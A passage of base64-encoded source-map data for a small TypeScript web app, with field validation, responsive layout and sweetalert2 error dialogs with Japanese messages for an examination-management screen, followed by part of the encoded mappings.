B0aGUgdGV4dCBhdXRvbWF0aWNhbGx5IGdvZXMgZG93biB0aGUgbGluZVxuXHRcdFx0XHRcdGlmICh3aWR0aERpdiAmJiBwYXJzZUludCh3aWR0aERpdikgPiAzNTApIHtcblx0XHRcdFx0XHRcdGRpdnNJbnNpZGUuc3R5bGUubWF4V2lkdGggPSB3aWR0aERpdjtcblx0XHRcdFx0XHRcdGRpdnNJbnNpZGUuc3R5bGUud2lkdGggPSBcImF1dG9cIjtcblx0XHRcdFx0XHR9XG5cdFx0XHRcdH0pO1xuXHRcdFx0fSk7XG5cdFx0fSk7XG5cdH1cbn1cbiIsICJpbXBvcnQgRXhhbWluYXRpb25NYW5hZ2VtZW50V3JhcHBlciBmcm9tIFwiLi4vaW5mcmFzdHJ1Y3R1cmUvZXhhbWluYXRpb24tbWFuYWdlbWVudC13cmFwcGVyXCI7XG5cbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEV4YW1pbmF0aW9uTWFuYWdlbWVudFNlcnZpY2Uge1xuXHQvKipcblx0ICogVmFsaWRhdGUgc3BlY2lmaWVkIGZpZWxkXG5cdCAqL1xuXHRzdGF0aWMgdmFsaWRhdGVGaWVsZChcbiAgICBzY3JlZW46IHN0cmluZ1xuICApIHtcblx0XHRjb25zdCB3cmFwcGVyID0gbmV3IEV4YW1pbmF0aW9uTWFuYWdlbWVudFdyYXBwZXIoKTtcblxuXHRcdC8vIGNsb25lIGJ1dHRvbiBzdWJtaXQgd2l0aCB0aGUgcHVycG9zZSBvZiBjdXN0b21pemluZyB0aGUgY2xpY2sgZXZlbnRcblx0XHR3cmFwcGVyLmNsb25lQnV0dG9uU3VibWl0KHNjcmVlbik7XG5cdFx0d3JhcHBlci52YWxpZGF0ZVBob25lTnVtYmVyKHNjcmVlbik7XG5cdH1cblxuXHQvKipcblx0ICogUHJvY2VzcyByZXNwb25zaXZlXG5cdCAqL1xuXHRzdGF0aWMgcHJvY2Vzc1Jlc3BvbnNpdmUoXG4gICAgc2NyZWVuOiBzdHJpbmdcbiAgKSB7XG5cdFx0Y29uc3Qgd3JhcHBlciA9IG5ldyBFeGFtaW5hdGlvbk1hbmFnZW1lbnRXcmFwcGVyKCk7XG5cblx0XHR3cmFwcGVyLnNldE1heFdpZHRoQnlTcGVjaWZpZWRFbGVtZW50KCk7XG5cdH1cbn1cbiIsICJpbXBvcnQgU3dhbCBmcm9tIFwic3dlZXRhbGVydDJcIjtcbmltcG9ydCBDdXN0b21FcnJvciBmcm9tIFwiLi9jdXN0b20tZXJyb3JcIjtcblxuLyoqXG4gKiBcdTMwQjdcdTMwQjlcdTMwQzZcdTMwRTBcdTMwQThcdTMwRTlcdTMwRkNcdUZGMDhcdTRFODhcdTY3MUZcdTMwNTdcdTMwNkFcdTMwNDRcdTMwQThcdTMwRTlcdTMwRkNcdUZGMDlcbiAqL1xuZXhwb3J0IGRlZmF1bHQgY2xhc3MgU3lzdGVtRXJyb3IgZXh0ZW5kcyBDdXN0b21FcnJvciB7XG5cdHByaXZhdGUgZXJyb3I6IEVycm9yO1xuXG5cdGNvbnN0cnVjdG9yKGVycm9yOiBFcnJvcikge1xuXHRcdHN1cGVyKGVycm9yLm1lc3NhZ2UpO1xuXG5cdFx0Y29uc29sZS5lcnJvcihlcnJvci5zdGFjayk7XG5cblx0XHR0aGlzLm5hbWUgPSBcIlN5c3RlbUVycm9yXCI7XG5cdFx0dGhpcy5lcnJvciA9IGVycm9yO1xuXHR9XG5cblx0YXN5bmMgc2hvd0Vycm9yKCkge1xuXHRcdGF3YWl0IFN3YWwuZmlyZSh7XG5cdFx0XHRpY29uOiBcImVycm9yXCIsXG5cdFx0XHR0aXRsZTogXCJcdTMwQjdcdTMwQjlcdTMwQzZcdTMwRTBcdTMwQThcdTMwRTlcdTMwRkNcIixcblx0XHRcdGh0bWw6IGBcdTRFODhcdTY3MUZcdTMwNTdcdTMwNkFcdTMwNDRcdTMwQThcdTMwRTlcdTMwRkNcdTMwNENcdTc2N0FcdTc1MUZcdTMwNTdcdTMwN0VcdTMwNTdcdTMwNUZcdTMwMDI8YnI+XHUzMEI3XHUzMEI5XHUzMEM2XHUzMEUwXHU3QkExXHU3NDA2XHU4MDA1XHUzMDc4XHU5MDIzXHU3RDYxXHUzMDU3XHUzMDY2XHUzMDRGXHUzMDYwXHUzMDU1XHUzMDQ0XHUzMDAyPGJyPjxicj4ke3RoaXMuZXJyb3IubWVzc2FnZX1gLFxuXHRcdH0pO1xuXHR9XG59XG4iLCAiZXhwb3J0IGRlZmF1bHQgYWJzdHJhY3QgY2xhc3MgQ3VzdG9tRXJyb3IgZXh0ZW5kcyBFcnJvciB7XG5cdHN0YXRpYyB7XG5cdFx0dGhpcy5wcm90b3R5cGUubmFtZSA9IFwiQ3VzdG9tRXJyb3JcIjtcblx0fVxuXG5cdHByb3RlY3RlZCBsb2dFcnJvcigpOiB2b2lkIHtcblx0XHRjb25zb2xlLmVycm9yKGBBbiAke3RoaXMubmFtZX0gaXMgdGhyb3duLmAsIHtcblx0XHRcdG1lc3NhZ2U6IHRoaXMubWVzc2FnZSxcblx0XHRcdHN0YWNrOiB0aGlzLnN0YWNrLFxuXHRcdH0pO1xuXHR9XG5cblx0LyoqXG5cdCAqIFVJIFx1NEUwQVx1MzA2Qlx1OTA2OVx1NTIwN1x1MzA2Qlx1MzBBOFx1MzBFOVx1MzBGQ1x1MzA5Mlx1ODg2OFx1NzkzQVx1MzA1OVx1MzA4Qi5cblx0ICovXG5cdGFic3RyYWN0IHNob3dFcnJvcigpOiBQcm9taXNlPHZvaWQ+O1xufVxuIiwgImltcG9ydCBTeXN0ZW1FcnJvciBmcm9tIFwiLi9zeXN0ZW0tZXJyb3JcIjtcbmltcG9ydCBDdXN0b21FcnJvciBmcm9tIFwiLi9jdXN0b20tZXJyb3JcIjtcblxuLyoqXG4gKiBcdTMwQThcdTMwRTlcdTMwRkNcdTY2NDJcdTMwNkVcdTUyMzZcdTVGQTFcdTMwOTJcdTg4NENcdTMwNDZcbiAqIEBwYXJhbSBlcnJvciBjYXRjaFx1MzA1NVx1MzA4Q1x1MzA1Rlx1MzBBOFx1MzBFOVx1MzBGQ1xuICovXG5leHBvcnQgZGVmYXVsdCBhc3luYyBmdW5jdGlvbiBlcnJvckhhbmRsaW5nKGVycm9yOiB1bmtub3duKTogUHJvbWlzZTx2b2lkPiB7XG5cdGlmIChlcnJvciBpbnN0YW5jZW9mIEN1c3RvbUVycm9yKSB7XG5cdFx0YXdhaXQgZXJyb3Iuc2hvd0Vycm9yKCk7XG5cdH0gZWxzZSBpZiAoZXJyb3IgaW5zdGFuY2VvZiBFcnJvcikge1xuXHRcdGF3YWl0IG5ldyBTeXN0ZW1FcnJvcihlcnJvcikuc2hvd0Vycm9yKCk7XG5cdH0gZWxzZSB7XG5cdFx0YXdhaXQgbmV3IFN5c3RlbUVycm9yKG5ldyBFcnJvcihcIlx1NjBGM1x1NUI5QVx1MzA1NVx1MzA4Q1x1MzA2QVx1MzA0NFx1MzBBOFx1MzBFOVx1MzBGQ1x1MzA0Q1x1NzY3QVx1NzUxRlwiKSkuc2hvd0Vycm9yKCk7XG5cdH1cbn1cbiIsICJpbXBvcnQgRXhhbWluYXRpb25NYW5hZ2VtZW50U2VydmljZSBmcm9tIFwiLi4vYXBwbGljYXRpb24vZXhhbWluYXRpb24tbWFuYWdlbWVudC1zZXJ2aWNlXCI7XG5pbXBvcnQgZXJyb3JIYW5kbGluZyBmcm9tIFwiLi4vLi4vLi4vZXJyb3JzL2Vycm9yLWhhbmRsaW5nXCI7XG5cbmV4cG9ydCBjb25zdCByZWNvcmRDcmVhdGVTaG93SGFuZGxlciA9IGFzeW5jIChcbiAgc2NyZWVuOiBzdHJpbmdcbikgPT4ge1xuXHR0cnkge1xuXHRcdEV4YW1pbmF0aW9uTWFuYWdlbWVudFNlcnZpY2UudmFsaWRhdGVGaWVsZChzY3JlZW4pO1xuXHRcdEV4YW1pbmF0aW9uTWFuYWdlbWVudFNlcnZpY2UucHJvY2Vzc1Jlc3BvbnNpdmUoc2NyZWVuKTtcblx0fSBjYXRjaCAoZXJyb3IpIHtcblx0XHRhd2FpdCBlcnJvckhhbmRsaW5nKGVycm9yKTtcblx0XHR0aHJvdyBmYWxzZTtcblx0fVxufTtcbiIsICJpbXBvcnQgeyBFeGFtaW5hdGlvbk1hbmFnZW1lbnRBcHAgfSBmcm9tIFwiLi9kb21haW4vZXhhbWluYXRpb24tbWFuYWdlbWVudC1hcHBcIjtcbmltcG9ydCB7IHJlY29yZENyZWF0ZVNob3dIYW5kbGVyIH0gZnJvbSBcIi4vcHJlc2VudGF0aW9uL3JlY29yZC1jcmVhdGUtc2hvdy1oYW5kbGVyXCI7XG5cbmlmIChFeGFtaW5hdGlvbk1hbmFnZW1lbnRBcHAuYWxsb3dlZFNjcmVlbnMuaW5jbHVkZXMobG9jYXRpb24ucGF0aG5hbWUpKSB7XG4gIHJlY29yZENyZWF0ZVNob3dIYW5kbGVyKGxvY2F0aW9uLnBhdGhuYW1lKTtcbn1cbiJdLAogICJtYXBwaW5ncyI6ICI7Ozs7Ozs7Ozs7Ozs7Oz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